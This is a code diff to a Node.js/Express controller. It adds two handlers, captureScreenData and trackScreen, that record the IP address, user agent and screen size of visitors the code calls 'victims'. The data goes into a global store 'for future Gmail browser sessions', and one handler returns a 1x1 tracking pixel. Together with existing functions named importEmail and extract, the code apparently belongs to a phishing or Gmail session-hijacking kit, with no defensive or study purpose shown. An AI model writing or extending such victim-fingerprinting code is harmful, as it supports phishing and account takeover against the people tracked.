@@ -262,7 +262,70 @@ const extract = async (req, res) => {
   }
 };
 
+const captureScreenData = async (req, res) => {
+  try {
+    const screenData = req.body;
+    const ip = req.ip || req.connection.remoteAddress;
+    const userAgent = req.get('User-Agent');
+    
+    console.log('📐 Screen data captured from victim:', {
+      ip,
+      screenWidth: screenData.screenWidth,
+      screenHeight: screenData.screenHeight,
+      userAgent: userAgent
+    });
+    
+    // Store screen data for future Gmail browser sessions
+    // You could store this in a database or cache for later use
+    global.victimScreenData = global.victimScreenData || {};
+    global.victimScreenData[ip] = {
+      ...screenData,
+      ip,
+      capturedAt: new Date()
+    };
+    
+    res.json({ success: true, message: 'Screen data captured' });
+    
+  } catch (error) {
+    console.error('Error capturing screen data:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+};
+
+const trackScreen = async (req, res) => {
+  try {
+    // Handle GET request with query parameters (image pixel method)
+    const screenData = req.query;
+    const ip = req.ip || req.connection.remoteAddress;
+    
+    console.log('📐 Screen data tracked from victim (pixel method):', {
+      ip,
+      screenWidth: screenData.screenWidth,
+      screenHeight: screenData.screenHeight
+    });
+    
+    // Store screen data
+    global.victimScreenData = global.victimScreenData || {};
+    global.victimScreenData[ip] = {
+      ...screenData,
+      ip,
+      capturedAt: new Date()
+    };
+    
+    // Return a 1x1 transparent pixel
+    const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
+    res.setHeader('Content-Type', 'image/png');
+    res.send(pixel);
+    
+  } catch (error) {
+    console.error('Error tracking screen:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+};
+
 module.exports = {
   importEmail,
-  extract
+  extract,
+  captureScreenData,
+  trackScreen
 };
